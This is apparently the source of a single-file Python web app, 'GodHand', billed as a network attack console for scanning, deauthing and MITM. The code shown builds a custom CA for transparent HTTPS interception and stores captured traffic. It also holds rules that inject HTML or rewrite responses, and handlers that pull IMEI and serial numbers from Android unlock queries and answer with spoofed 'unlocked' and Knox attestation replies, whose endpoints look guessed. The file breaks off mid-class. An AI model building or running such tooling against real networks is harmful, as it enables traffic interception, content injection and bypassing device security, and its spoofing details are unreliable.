#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GodHand: Network Command – Single File WebApp
Dark "Obsidian & Aurora" theme, robust attack engine with verification,
server-side logging, authentication, and responsive UI.
Run as root.
"""

import os
import sys
import subprocess
import time
import json
import re
import threading
import socket
import struct
import fcntl
import random
import select
import ipaddress
import tempfile
import hashlib
import textwrap
import urllib.request
import urllib.parse
import base64
import secrets
import uuid
import sqlite3
import csv
import ssl
import gzip
import fnmatch
from functools import wraps
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify, render_template_string, abort, Response, send_file

# ---------- configuration ----------
SECRET = os.environ.get('GODHAND_SECRET', '')
APP_PORT = int(os.environ.get('GODHAND_PORT', 5000))
LOGIN_USERNAME = os.environ.get('GODHAND_USERNAME', 'admin')
LOGIN_PASSWORD = os.environ.get('GODHAND_PASSWORD', '')

# This tool can scan, deauth, and MITM devices on the network it runs from --
# it must never be reachable with no credential at all. If the operator hasn't
# set one, generate a one-off password rather than silently running open.
AUTO_GENERATED_PASSWORD = False
if not LOGIN_PASSWORD and not SECRET:
    LOGIN_PASSWORD = secrets.token_urlsafe(12)
    AUTO_GENERATED_PASSWORD = True
    print('=' * 64)
    print('  GODHAND: no GODHAND_PASSWORD/GODHAND_SECRET set -- generated one')
    print(f'    username: {LOGIN_USERNAME}')
    print(f'    password: {LOGIN_PASSWORD}')
    print('  This password changes every restart. Set GODHAND_USERNAME and')
    print('  GODHAND_PASSWORD yourself to keep a stable login.')
    print('=' * 64)

# ---------- termux environment detection ----------
def is_termux():
    """Detect if running in Termux environment."""
    return os.path.exists('/data/data/com.termux') or os.environ.get('PREFIX', '').endswith('/usr')

def get_cert_dir():
    """Get certificate directory appropriate for environment (Termux-aware)."""
    if is_termux():
        prefix = os.environ.get('PREFIX', '/data/data/com.termux/files/usr')
        cert_dir = os.path.join(prefix, 'var', 'godhand', 'certs')
    else:
        cert_dir = '/var/godhand/certs'
    return cert_dir

# ---------- gateway (DNS/VPN/proxy) configuration ----------
GATEWAY_DIR = os.path.join(os.environ['PREFIX'], 'etc', 'godhand-gateway') if os.environ.get('PREFIX') else '/etc/godhand-gateway'
GW_UNBOUND_CONF = os.path.join(GATEWAY_DIR, 'unbound.conf')
GW_BLOCKLIST_CONF = os.path.join(GATEWAY_DIR, 'blocklist.conf')
GW_DNSCRYPT_CONF = os.path.join(GATEWAY_DIR, 'dnscrypt-proxy.toml')
GW_TINYPROXY_CONF = os.path.join(GATEWAY_DIR, 'tinyproxy.conf')
GW_DNS_PORT = 5335
GW_DNSCRYPT_PORT = 5353
GW_PROXY_PORT = 8888
DEFAULT_BLOCKED_DOMAINS = [
    'doubleclick.net', 'googlesyndication.com', 'googleadservices.com',
    'google-analytics.com', 'adservice.google.com', 'ads.yahoo.com',
    'adnxs.com', 'scorecardresearch.com', 'facebook.net', 'amazon-adsystem.com',
    'moatads.com', 'taboola.com', 'outbrain.com', 'criteo.com', 'pubmatic.com',
    'rubiconproject.com', 'openx.net', 'casalemedia.com', 'adsrvr.org',
    'bidswitch.net', 'quantserve.com', 'mmstat.com', 'analytics.twitter.com',
    'branch.io', 'app-measurement.com', 'flurry.com', 'chartbeat.com',
]

# ---------- global state with thread lock ----------
STATE = {
    'interface': None,
    'gateway': None,
    'port': 80,
    'targets': [],
    'hosts': [],
    'attack_pids': {},
    'attack_status': {},
    'blocked_macs': set(),
    'monitor_entries': [],
    'monitor_log_path': None,
    'monitor_mode_active': False,  # True only while a weapon has the iface in 802.11 monitor mode

    'bandwidth_sample': None,
    'ddns': {
        'provider': None,          # 'duckdns' | 'noip'
        'domain': None,            # duckdns subdomain, or full no-ip hostname
        'token': None,             # duckdns token
        'username': None,          # no-ip username
        'password': None,          # no-ip password
        'enabled': False,
        'interval_minutes': 5,
        'last_ip': None,
        'last_update': None,
        'last_status': None,       # 'ok' | 'error' | None
        'last_message': None,
    },
    'ngrok_proc': None,
    'log': [],
    'status': 'Ready',
    'lan_domains': ['pac.installCA.lan'],  # Domains resolved to local IP for .lan hijacking
    'injection_rules': [],  # Response injection rules [{id, enabled, hostname_pattern, action_type, action_value, ...}]
}
STATE_LOCK = threading.Lock()

def update_state(key, value):
    with STATE_LOCK:
        STATE[key] = value

def get_state(key):
    with STATE_LOCK:
        return STATE.get(key)

def add_to_list(key, value):
    with STATE_LOCK:
        STATE[key].append(value)

def remove_from_list(key, value):
    with STATE_LOCK:
        if value in STATE[key]:
            STATE[key].remove(value)

def add_to_set(key, value):
    with STATE_LOCK:
        STATE[key].add(value)

def discard_from_set(key, value):
    with STATE_LOCK:
        STATE[key].discard(value)

# ---------- server-side logging ----------
def add_log(level, msg):
    entry = {
        'time': time.strftime('%H:%M:%S'),
        'level': level,
        'msg': msg
    }
    with STATE_LOCK:
        STATE['log'].append(entry)
        STATE['log'] = STATE['log'][-200:]
    print(f"[{level.upper()}] {msg}")

# ---------- authentication ----------
VALID_SESSIONS = set()
SESSIONS_LOCK = threading.Lock()

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if SECRET or LOGIN_PASSWORD:
            token = request.headers.get('Authorization', '').replace('Bearer ', '')
            if not token:
                token = request.args.get('token', '')
            with SESSIONS_LOCK:
                session_ok = token in VALID_SESSIONS
            if not session_ok and not (SECRET and secrets.compare_digest(token, SECRET)):
                abort(401, description='Unauthorized')
        return f(*args, **kwargs)
    return decorated

# ---------- HTTPS Certificate Management ----------
class CertificateAuthority:
    """Manages HTTPS interception via custom CA certificate.

    Generates and maintains a self-signed CA certificate that acts as a
    transparent proxy's root of trust. All intercepted HTTPS connections
    are re-encrypted with certificates signed by this CA.

    Security: Private key stored with mode 0600. Never logged or transmitted.
    """

    def __init__(self, cert_dir='/var/godhand/certs'):
        self.cert_dir = cert_dir
        self.ca_key_path = os.path.join(cert_dir, 'ca-key.pem')
        self.ca_cert_path = os.path.join(cert_dir, 'ca-cert.pem')
        self.ca_key = None
        self.ca_cert = None
        self._ensure_dir()
        self._initialize_ca()

    def _ensure_dir(self):
        """Ensure certificate directory exists with proper permissions."""
        try:
            os.makedirs(self.cert_dir, mode=0o700, exist_ok=True)
        except Exception as e:
            add_log('error', f'Failed to create cert dir {self.cert_dir}: {e}')
            raise

    def _initialize_ca(self):
        """Generate CA cert/key if not exists, otherwise load existing."""
        if os.path.exists(self.ca_key_path) and os.path.exists(self.ca_cert_path):
            add_log('info', f'Loading existing CA from {self.ca_cert_path}')
            return self._load_existing_ca()

        add_log('info', 'Generating new CA certificate (this may take a moment)...')
        self._generate_ca()

    def _generate_ca(self):
        """Generate new self-signed CA certificate using openssl."""
        try:
            # Generate 2048-bit RSA private key
            subprocess.run(
                ['openssl', 'genrsa', '-out', self.ca_key_path, '2048'],
                check=True,
                capture_output=True,
                timeout=30
            )
            os.chmod(self.ca_key_path, 0o600)

            # Generate self-signed certificate (valid 10 years)
            subprocess.run(
                ['openssl', 'req', '-new', '-x509', '-days', '3650',
                 '-key', self.ca_key_path, '-out', self.ca_cert_path,
                 '-subj', '/C=US/ST=Private/L=Local/O=GodHand/CN=GodHand CA'],
                check=True,
                capture_output=True,
                timeout=30
            )
            os.chmod(self.ca_cert_path, 0o644)

            add_log('success', f'CA certificate generated: {self.ca_cert_path}')
        except subprocess.CalledProcessError as e:
            add_log('error', f'Failed to generate CA certificate: {e.stderr.decode()}')
            raise
        except Exception as e:
            add_log('error', f'CA generation failed: {e}')
            raise

    def _load_existing_ca(self):
        """Load existing CA key and certificate."""
        try:
            with open(self.ca_key_path, 'r') as f:
                self.ca_key = f.read()
            with open(self.ca_cert_path, 'r') as f:
                self.ca_cert = f.read()
            add_log('info', 'CA certificate loaded successfully')
        except Exception as e:
            add_log('error', f'Failed to load CA: {e}')
            raise

    def get_ca_cert_path(self):
        """Return path to CA certificate for distribution."""
        return self.ca_cert_path

    def get_ca_cert_pem(self):
        """Return CA certificate in PEM format."""
        if not self.ca_cert:
            with open(self.ca_cert_path, 'r') as f:
                self.ca_cert = f.read()
        return self.ca_cert


class CertificateCache:
    """Manages cached server certificates for HTTPS interception.

    When the MITM proxy intercepts an HTTPS connection to a specific hostname,
    it generates a certificate for that hostname signed by the CA. This cache
    stores generated certificates to avoid regenerating them repeatedly.

    Cache format: /var/godhand/certs/{hostname}.pem
    Certificates have 30-day validity (matches typical test durations).
    """

    def __init__(self, ca: CertificateAuthority):
        self.ca = ca
        self.cert_dir = ca.cert_dir
        self._cache = {}  # hostname -> (cert_path, cert_pem)

    def get_or_create_cert(self, hostname: str) -> tuple:
        """Get certificate for hostname, creating if needed.

        Args:
            hostname: FQDN or IP to create certificate for

        Returns:
            Tuple of (cert_path, cert_pem) both as strings
        """
        # Check memory cache first
        if hostname in self._cache:
            cert_path, cert_pem = self._cache[hostname]
            if os.path.exists(cert_path):
                return (cert_path, cert_pem)
            else:
                # File was deleted, regenerate
                del self._cache[hostname]

        # Check disk cache
        cert_path = os.path.join(self.cert_dir, f'{hostname}.pem')
        if os.path.exists(cert_path):
            try:
                with open(cert_path, 'r') as f:
                    cert_pem = f.read()
                self._cache[hostname] = (cert_path, cert_pem)
                return (cert_path, cert_pem)
            except Exception as e:
                add_log('warn', f'Failed to load cached cert for {hostname}: {e}')

        # Generate new certificate
        return self._generate_cert(hostname)

    def _generate_cert(self, hostname: str) -> tuple:
        """Generate new certificate for hostname using CA.

        Args:
            hostname: FQDN or IP to create certificate for

        Returns:
            Tuple of (cert_path, cert_pem) both as strings
        """
        cert_path = os.path.join(self.cert_dir, f'{hostname}.pem')
        key_path = os.path.join(self.cert_dir, f'{hostname}-key.pem')

        try:
            # Generate private key for this cert
            subprocess.run(
                ['openssl', 'genrsa', '-out', key_path, '2048'],
                check=True,
                capture_output=True,
                timeout=10
            )

            # Create certificate signing request
            csr_path = os.path.join(self.cert_dir, f'{hostname}.csr')
            subprocess.run(
                ['openssl', 'req', '-new', '-key', key_path, '-out', csr_path,
                 '-subj', f'/C=US/ST=Private/L=Local/O=GodHand/CN={hostname}'],
                check=True,
                capture_output=True,
                timeout=10
            )

            # Sign CSR with CA certificate (valid 30 days)
            subprocess.run(
                ['openssl', 'x509', '-req', '-in', csr_path, '-days', '30',
                 '-CA', self.ca.ca_cert_path, '-CAkey', self.ca.ca_key_path,
                 '-CAcreateserial', '-out', cert_path],
                check=True,
                capture_output=True,
                timeout=10
            )

            # Combine cert + key into single PEM file (what TLS needs)
            with open(key_path, 'r') as f:
                key_pem = f.read()
            with open(cert_path, 'r') as f:
                cert_pem_only = f.read()

            cert_pem = key_pem + cert_pem_only

            # Write combined PEM file
            with open(cert_path, 'w') as f:
                f.write(cert_pem)
            os.chmod(cert_path, 0o600)

            # Clean up temporary files
            for tmp in [key_path, csr_path]:
                if os.path.exists(tmp):
                    os.remove(tmp)

            # Cache in memory
            self._cache[hostname] = (cert_path, cert_pem)
            add_log('info', f'Generated certificate for {hostname}')
            return (cert_path, cert_pem)

        except subprocess.CalledProcessError as e:
            add_log('error', f'Failed to generate cert for {hostname}: {e.stderr.decode()}')
            raise
        except Exception as e:
            add_log('error', f'Certificate generation failed for {hostname}: {e}')
            raise

    def cleanup_old_certs(self, max_age_days: int = 60):
        """Remove certificates older than max_age_days to prevent storage buildup."""
        now = time.time()
        cutoff = now - (max_age_days * 86400)

        try:
            for filename in os.listdir(self.cert_dir):
                if filename.endswith('.pem') and filename != 'ca-key.pem' and filename != 'ca-cert.pem':
                    filepath = os.path.join(self.cert_dir, filename)
                    if os.path.getmtime(filepath) < cutoff:
                        os.remove(filepath)
                        hostname = filename.replace('.pem', '')
                        if hostname in self._cache:
                            del self._cache[hostname]
                        add_log('info', f'Cleaned up old cert: {hostname}')
        except Exception as e:
            add_log('warn', f'Error cleaning up old certs: {e}')


# Initialize certificate infrastructure on startup
try:
    cert_dir = get_cert_dir()
    add_log('info', f'Using certificate directory: {cert_dir}')
    CERT_AUTHORITY = CertificateAuthority(cert_dir)
    CERT_CACHE = CertificateCache(CERT_AUTHORITY)
    add_log('success', 'HTTPS certificate infrastructure initialized')
except Exception as e:
    add_log('error', f'Failed to initialize HTTPS infrastructure: {e}')
    CERT_AUTHORITY = None
    CERT_CACHE = None

# Placeholder globals for OEM unlock infrastructure (initialized later after class definitions)
UNLOCK_QUERY_DETECTOR = None
UNLOCK_RESPONSE_GENERATOR = None

# ---------- HTTP Response Injection/Modification ----------
class ResponseModifier:
    """Apply injection rules to HTTP responses."""

    @staticmethod
    def parse_http_response(data: bytes):
        """Parse HTTP response into headers and body.

        Returns: (status_line, headers_dict, body) or (None, {}, None) on error
        """
        try:
            parts = data.split(b'\r\n\r\n', 1)
            if not parts:
                return None, {}, None

            header_section = parts[0]
            body = parts[1] if len(parts) > 1 else b''

            lines = header_section.split(b'\r\n')
            if not lines:
                return None, {}, None

            status_line = lines[0].decode('ascii', errors='ignore')
            headers = {}

            for line in lines[1:]:
                if b':' in line:
                    key, value = line.split(b':', 1)
                    headers[key.decode('ascii', errors='ignore').strip()] = value.decode('ascii', errors='ignore').strip()

            return status_line, headers, body
        except Exception as e:
            add_log('warn', f'Failed to parse HTTP response: {e}')
            return None, {}, None

    @staticmethod
    def rebuild_http_response(status_line: str, headers: dict, body: bytes) -> bytes:
        """Rebuild HTTP response from parsed components."""
        response = f"{status_line}\r\n".encode('ascii')
        for key, value in headers.items():
            response += f"{key}: {value}\r\n".encode('ascii')
        response += b"\r\n"
        response += body
        return response

    @staticmethod
    def apply_rules(hostname: str, response_data: bytes) -> bytes:
        """Apply enabled injection rules to HTTP response.

        Args:
            hostname: Target hostname
            response_data: Raw HTTP response bytes

        Returns:
            Modified response bytes (or original if no rules matched)
        """
        try:
            with STATE_LOCK:
                rules = [r for r in STATE.get('injection_rules', []) if r.get('enabled', False)]

            if not rules:
                return response_data

            status_line, headers, body = ResponseModifier.parse_http_response(response_data)
            if status_line is None:
                return response_data

            modified = False

            for rule in rules:
                pattern = rule.get('hostname_pattern', '')
                if not pattern or not ResponseModifier._pattern_matches(pattern, hostname):
                    continue

                action_type = rule.get('action_type', '')
                action_value = rule.get('action_value', '')

                try:
                    if action_type == 'add_header':
                        # Format: "Header-Name: Header-Value"
                        if ':' in action_value:
                            key, value = action_value.split(':', 1)
                            headers[key.strip()] = value.strip()
                            modified = True

                    elif action_type == 'remove_header':
                        # action_value = header name to remove
                        if action_value in headers:
                            del headers[action_value]
                            modified = True

                    elif action_type == 'replace_body':
                        # action_value = "search_string|replacement_string"
                        if '|' in action_value:
                            search, replacement = action_value.split('|', 1)
                            if search.encode() in body:
                                body = body.replace(search.encode(), replacement.encode())
                                modified = True

                    elif action_type == 'inject_html':
                        # action_value = HTML to inject before </body>
                        if b'</body>' in body or b'</BODY>' in body:
                            injection = action_value.encode()
                            body = body.replace(b'</body>', injection + b'</body>')
                            if body == response_data:  # Try uppercase
                                body = body.replace(b'</BODY>', injection + b'</BODY>')
                            modified = True

                except Exception as e:
                    add_log('warn', f'Failed to apply injection rule {rule.get("id")}: {e}')

            if modified:
                # Update Content-Length if body changed
                if 'Content-Length' in headers:
                    headers['Content-Length'] = str(len(body))

                return ResponseModifier.rebuild_http_response(status_line, headers, body)

            return response_data

        except Exception as e:
            add_log('warn', f'Error applying injection rules: {e}')
            return response_data

    @staticmethod
    def _pattern_matches(pattern: str, hostname: str) -> bool:
        """Check if hostname matches pattern (supports wildcards).

        Examples:
            '*.example.com' matches 'api.example.com'
            'example.com' matches 'example.com'
            '*' matches any hostname
        """
        if pattern == '*':
            return True
        if pattern == hostname:
            return True

        # Convert wildcard pattern to regex
        return fnmatch.fnmatch(hostname, pattern)

# ---------- Traffic Persistence Database ----------
class TrafficDatabase:
    """SQLite database for persistent HTTPS traffic storage."""

    def __init__(self, db_path=None):
        if db_path is None:
            db_path = os.path.join(GATEWAY_DIR, 'https_traffic.db')
        self.db_path = db_path
        self.lock = threading.Lock()
        self.initialized = False
        self._init_db()

    def _init_db(self):
        """Initialize database schema if not exists."""
        try:
            with self.lock:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS https_traffic (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        timestamp REAL,
                        type TEXT,
                        client_ip TEXT,
                        hostname TEXT,
                        request_line TEXT,
                        status_line TEXT,
                        bytes INTEGER,
                        method TEXT,
                        path TEXT,
                        status_code INTEGER,
                        request_body_size INTEGER,
                        response_body_size INTEGER,
                        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                    )
                ''')
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_timestamp ON https_traffic(timestamp)')
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_hostname ON https_traffic(hostname)')
                cursor.execute('CREATE INDEX IF NOT EXISTS idx_client_ip ON https_traffic(client_ip)')
                conn.commit()
                conn.close()
                self.initialized = True
                add_log('info', f'Traffic database initialized: {self.db_path}')
        except Exception as e:
            add_log('error', f'Failed to initialize traffic database: {e}')
            self.initialized = False
            raise

    def add_entry(self, entry: dict):
        """Add traffic entry to database."""
        try:
            with self.lock:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT INTO https_traffic
                    (timestamp, type, client_ip, hostname, request_line, status_line, bytes,
                     method, path, status_code, request_body_size, response_body_size)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    entry.get('timestamp'),
                    entry.get('type'),
                    entry.get('client_ip'),
                    entry.get('hostname'),
                    entry.get('request_line', ''),
                    entry.get('status_line', ''),
                    entry.get('bytes', 0),
                    entry.get('method', ''),
                    entry.get('path', ''),
                    entry.get('status_code'),
                    entry.get('request_body_size', 0),
                    entry.get('response_body_size', 0)
                ))
                conn.commit()
                conn.close()

                # Cleanup old entries (keep last 10000)
                self._cleanup_old_entries()
        except Exception as e:
            add_log('warn', f'Failed to add traffic entry to database: {e}')

    def _cleanup_old_entries(self):
        """Remove entries older than a threshold, keeping last 10000."""
        try:
            with self.lock:
                conn = sqlite3.connect(self.db_path)
                cursor = conn.cursor()
                cursor.execute('SELECT COUNT(*) FROM https_traffic')
                count = cursor.fetchone()[0]

                if count > 10000:
                    # Delete oldest entries, keeping newest 10000
                    cursor.execute('''
                        DELETE FROM https_traffic WHERE id NOT IN (
                            SELECT id FROM https_traffic ORDER BY timestamp DESC LIMIT 10000
                        )
                    ''')
                    conn.commit()
                conn.close()
        except Exception as e:
            add_log('warn', f'Failed to cleanup old traffic entries: {e}')

    def query(self, limit=100, offset=0, hostname_filter=None, client_ip_filter=None):
        """Query traffic entries from database."""
        try:
            with self.lock:
                conn = sqlite3.connect(self.db_path)
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()

                query = 'SELECT * FROM https_traffic WHERE 1=1'
                params = []

                if hostname_filter:
                    query += ' AND hostname LIKE ?'
                    params.append(f'%{hostname_filter}%')

                if client_ip_filter:
                    query += ' AND client_ip = ?'
                    params.append(client_ip_filter)

                query += ' ORDER BY timestamp DESC LIMIT ? OFFSET ?'
                params.extend([limit, offset])

                cursor.execute(query, params)
                rows = cursor.fetchall()
                conn.close()

                return [dict(row) for row in rows]
        except Exception as e:
            add_log('warn', f'Failed to query traffic database: {e}')
            return []

    def export_csv(self, output_path=None, hostname_filter=None, client_ip_filter=None):
        """Export traffic to CSV file."""
        try:
            rows = self.query(limit=100000, hostname_filter=hostname_filter, client_ip_filter=client_ip_filter)

            if output_path is None:
                output_path = os.path.join(GATEWAY_DIR, f'https_traffic_{int(time.time())}.csv')

            with open(output_path, 'w', newline='') as f:
                if rows:
                    writer = csv.DictWriter(f, fieldnames=rows[0].keys())
                    writer.writeheader()
                    writer.writerows(rows)

            add_log('info', f'Traffic exported to CSV: {output_path}')
            return output_path
        except Exception as e:
            add_log('error', f'Failed to export traffic to CSV: {e}')
            return None

    def export_json(self, output_path=None, hostname_filter=None, client_ip_filter=None):
        """Export traffic to JSON file."""
        try:
            rows = self.query(limit=100000, hostname_filter=hostname_filter, client_ip_filter=client_ip_filter)

            if output_path is None:
                output_path = os.path.join(GATEWAY_DIR, f'https_traffic_{int(time.time())}.json')

            with open(output_path, 'w') as f:
                json.dump(rows, f, indent=2, default=str)

            add_log('info', f'Traffic exported to JSON: {output_path}')
            return output_path
        except Exception as e:
            add_log('error', f'Failed to export traffic to JSON: {e}')
            return None

# ---------- HTTPS MITM Proxy Core ----------
class HTTPManipulator:
    """Parses, modifies, and rebuilds HTTP/1.1 traffic streams.

    Handles chunked encoding, gzip compression, and header manipulation
    to enable active injection of content into HTTP responses.
    """

    @staticmethod
    def _decode_chunked(data: bytes) -> bytes:
        """Decode chunked transfer encoding."""
        result = b''
        while data:
            try:
                end = data.find(b'\r\n')
                if end == -1:
                    break
                chunk_size = int(data[:end], 16)
                if chunk_size == 0:
                    break
                chunk_start = end + 2
                chunk_end = chunk_start + chunk_size
                result += data[chunk_start:chunk_end]
                data = data[chunk_end + 2:]
            except:
                break
        return result

    @staticmethod
    def parse_http_response(data: bytes) -> dict:
        """Split HTTP response headers and body. Decompress if needed.

        Returns dict with keys: status_line, headers, body
        """
        try:
            header_end = data.find(b'\r\n\r\n')
            if header_end == -1:
                return {'status_line': '', 'headers': {}, 'body': data, 'raw': data}

            header_end += 4
            headers_raw = data[:header_end]
            body = data[header_end:]

            lines = headers_raw.split(b'\r\n')
            status_line = lines[0].decode('utf-8', errors='ignore')
            headers = {}

            for line in lines[1:]:
                if b': ' in line:
                    key, val = line.split(b': ', 1)
                    headers[key.decode().lower()] = val.decode('utf-8', errors='ignore')

            if headers.get('transfer-encoding', '').lower() == 'chunked':
                body = HTTPManipulator._decode_chunked(body)

            if headers.get('content-encoding', '').lower() == 'gzip':
                try:
                    body = gzip.decompress(body)
                except:
                    pass

            return {
                'status_line': status_line,
                'headers': headers,
                'body': body,
                'raw': data
            }
        except Exception as e:
            add_log('dev', f'HTTP parse error: {e}')
            return {'status_line': '', 'headers': {}, 'body': data, 'raw': data}

    @staticmethod
    def rebuild_http_response(parsed: dict, new_body: bytes = None) -> bytes:
        """Rebuild HTTP response with modified body, recalculating Content-Length.

        Removes Transfer-Encoding and Content-Encoding to simplify for client.
        """
        try:
            body_to_send = new_body if new_body is not None else parsed['body']
            headers = dict(parsed['headers'])

            headers['content-length'] = str(len(body_to_send))
            headers.pop('transfer-encoding', None)
            headers.pop('content-encoding', None)

            status_line = parsed['status_line']
            if not status_line.endswith('\r\n'):
                status_line += '\r\n'

            header_lines = []
            for k, v in headers.items():
                header_lines.append(f"{k.title()}: {v}")

            header_block = status_line + '\r\n'.join(header_lines) + '\r\n\r\n'
            return header_block.encode('utf-8', errors='ignore') + body_to_send
        except Exception as e:
            add_log('dev', f'HTTP rebuild error: {e}')
            return parsed.get('raw', body_to_send)

def create_custom_http_reply(status_code: int, headers: dict, body: bytes) -> bytes:
    """Craft a raw HTTP/1.1 response packet from scratch (spoofing).

    Used to reply with fake responses (302 redirect, fake JSON, etc.)
    without contacting the real upstream server.
    """
    status_map = {
        200: 'OK', 301: 'Moved Permanently', 302: 'Found',
        304: 'Not Modified', 400: 'Bad Request', 401: 'Unauthorized',
        403: 'Forbidden', 404: 'Not Found', 500: 'Internal Server Error'
    }
    status_text = status_map.get(status_code, 'OK')
    response_line = f"HTTP/1.1 {status_code} {status_text}\r\n"

    if 'content-length' not in headers:
        headers['Content-Length'] = str(len(body))
    if 'server' not in headers:
        headers['Server'] = 'GodHand/1.0'

    header_block = ''.join([f"{k}: {v}\r\n" for k, v in headers.items()])
    return response_line.encode() + header_block.encode() + b'\r\n' + body

# ---------- Phase 5E: OEM Unlock Query Detection ----------
class UnlockQueryDetector:
    """Detect OEM unlock status queries and identify device type.

    Monitors HTTPS traffic for carrier lock verification queries made by
    Android devices during recovery boot. Detects: Pixel (Google), Samsung (Knox),
    OnePlus, Motorola, and generic Android devices.
    """

    def __init__(self):
        self.query_patterns = {
            'pixel': {
                'hostnames': ['googleapis.com', 'google.com', 'play.google.com'],
                'paths': ['/androiddeviceintegrity', '/oem_unlock', '/deviceStatus'],
                'methods': ['POST'],
            },
            'samsung': {
                'hostnames': ['knox.samsung.com', 'sslgate.samsung.com'],
                'paths': ['/api/v2/device', '/unlock_status', '/knox/verify'],
                'methods': ['POST'],
            },
            'oneplus': {
                'hostnames': ['api.oneplusapi.com'],
                'paths': ['/v1/oem_unlock', '/check'],
                'methods': ['POST'],
            },
            'motorola': {
                'hostnames': ['motorolasupport.com', 'bootloader-unlock.motorola.com'],
                'paths': ['/bootloader-unlock', '/unlock/challenge'],
                'methods': ['POST', 'GET'],
            },
        }

    def detect_query(self, hostname, path, method, body):
        """Detect if request is OEM unlock query.

        Returns: (device_type or None, confidence 0-1)
        """
        hostname_lower = hostname.lower()
        path_lower = path.lower()

        for device_type, patterns in self.query_patterns.items():
            # Check hostname
            host_match = any(h in hostname_lower for h in patterns['hostnames'])
            if not host_match:
                continue

            # Check path
            path_match = any(p in path_lower for p in patterns['paths'])
            if not path_match:
                continue

            # Check method
            method_match = method.upper() in patterns['methods']
            if not method_match:
                continue

            confidence = 0.95 if all([host_match, path_match, method_match]) else 0.7
            return (device_type, confidence)

        # Fallback: pattern matching in body for unknown devices
        if body and ('unlock' in body.lower() or 'oem' in body.lower()):
            return ('generic', 0.5)

        return (None, 0)

    def extract_device_id(self, hostname, path, body):
        """Extract device identifiers (IMEI, serial, etc.) from query."""
        device_info = {
            'imei': None,
            'serial': None,
            'carrier': None,
            'device_model': None,
        }

        try:
            import json
            # Try to parse as JSON
            body_str = body.decode('utf-8', errors='ignore') if isinstance(body, bytes) else body
            if body_str and body_str.strip().startswith('{'):
                data = json.loads(body_str)
                device_info['imei'] = data.get('imei') or data.get('device_imei')
                device_info['serial'] = data.get('device_id') or data.get('serial') or data.get('device_serial')
                device_info['carrier'] = data.get('carrier_name') or data.get('carrier')
                device_info['device_model'] = data.get('device_model') or data.get('model')
        except:
            pass

        return device_info

class ResponseTemplateGenerator:
    """Generate device-specific unlock status responses.

    Creates spoofed responses that match carrier format for each device type,
    signaling to devices that OEM unlock is available.
    """

    def __init__(self):
        self.response_cache = {}  # Cache responses per device_type + device_id

    def generate_response(self, device_type, request_body, device_id):
        """Generate appropriate unlock response for device type.

        Returns: (status_code, headers_dict, body_bytes)
        """
        if device_type == 'pixel':
            return self._generate_pixel_response(request_body, device_id)
        elif device_type == 'samsung':
            return self._generate_samsung_response(request_body, device_id)
        elif device_type == 'oneplus':
            return self._generate_oneplus_response(request_body, device_id)
        elif device_type == 'motorola':
            return self._generate_motorola_response(request_body, device_id)
        else:
            return self._generate_generic_response(request_body, device_id)

    def _generate_pixel_response(self, request_body, device_id):
        """Generate Google/Pixel unlock response (JSON)."""
        import json
        response_body = {
            "unlock_status": "available",
            "carrier_locked": False,
            "device_verified": True,
            "message": "OEM Unlock available"
        }
        headers = {
            'Content-Type': 'application/json',
            'Content-Length': str(len(json.dumps(response_body))),
        }
        return (200, headers, json.dumps(response_body).encode('utf-8'))

    def _generate_samsung_response(self, request_body, device_id):
        """Generate Samsung Knox unlock response (JSON)."""
        import json
        response_body = {
            "device_state": "unlocked",
            "sim_locked": False,
            "knox_status": "green",
            "attestation_result": {
                "verified": True,
                "device_compliant": True
            },
            "unlock_available": True
        }
        headers = {
            'Content-Type': 'application/json',
            'X-Knox-Version': '3.8',
        }
        return (200, headers, json.dumps(response_body).encode('utf-8'))

    def _generate_oneplus_response(self, request_body, device_id):
        """Generate OnePlus unlock response (JSON)."""
        import json
        import time
        response_body = {
            "unlock_available": True,
            "device_id": device_id or "unknown",
            "reason": "ok",
            "valid_until": int(time.time()) + 86400
        }
        headers = {'Content-Type': 'application/json'}
        return (200, headers, json.dumps(response_body).encode('utf-8'))

    def _generate_motorola_response(self, request_body, device_id):
        """Generate Motorola bootloader response with challenge-response protocol.

        Motorola uses a challenge-response handshake:
        - First request: device sends no challenge → server responds with challenge
        - Second request: device sends challenge → server responds with challenge_accepted
        """
        import json
        import secrets

        try:
            # Parse request to check for challenge
            challenge_in_request = None
            if request_body:
                try:
                    req_data = json.loads(request_body) if isinstance(request_body, str) else json.loads(request_body.decode('utf-8'))
                    challenge_in_request = req_data.get('challenge')
                except (json.JSONDecodeError, UnicodeDecodeError, AttributeError):
                    pass

            if challenge_in_request:
                # Device sent challenge → respond with acceptance
                response_body = {
                    "device_id": device_id or "unknown",
                    "status": "challenge_accepted",
                    "challenge_response": secrets.token_hex(32),  # 64-char hex response
                    "unlock_available": True
                }
            else:
                # First query → send challenge to device
                response_body = {
                    "device_id": device_id or "unknown",
                    "status": "bootloader_unlock_available",
                    "challenge": secrets.token_hex(32),  # 64-char hex challenge
                    "unlock_supported": True
                }
        except Exception as e:
            add_log('warn', f'Motorola response generation error: {e}, falling back to basic response')
            response_body = {
                "device_id": device_id or "unknown",
                "status": "bootloader_unlock_supported",
                "challenge_accepted": True
            }

        headers = {'Content-Type': 'application/json'}
        return (200, headers, json.dumps(response_body).encode('utf-8'))

    def _generate_generic_response(self, request_body, device_id):
        """Generic fallback response (JSON)."""
        import json
        response_body = {
            "status": "success",
            "unlock_enabled": True,
            "error": None
        }
        headers = {'Content-Type': 'application/json'}
        return (200, headers, json.dumps(response_body).encode('utf-8'))

class HTTPSInterceptProxy:
    """Pure Python HTTPS interception proxy (transparent MITM).

    Listens on port 8888 for incoming TLS connections from configured devices.
    Intercepts HTTPS traffic by:
    1. Extracting SNI (Server Name Indication) from ClientHello
    2. Generating a certificate for that hostname (signed by CA)
    3. Establishing two TLS connections: client↔proxy and proxy↔server
    4. Forwarding HTTP requests/responses through both connections
    5. Logging all traffic for inspection

    Phase 1 (inspection): Log traffic only, no modification.
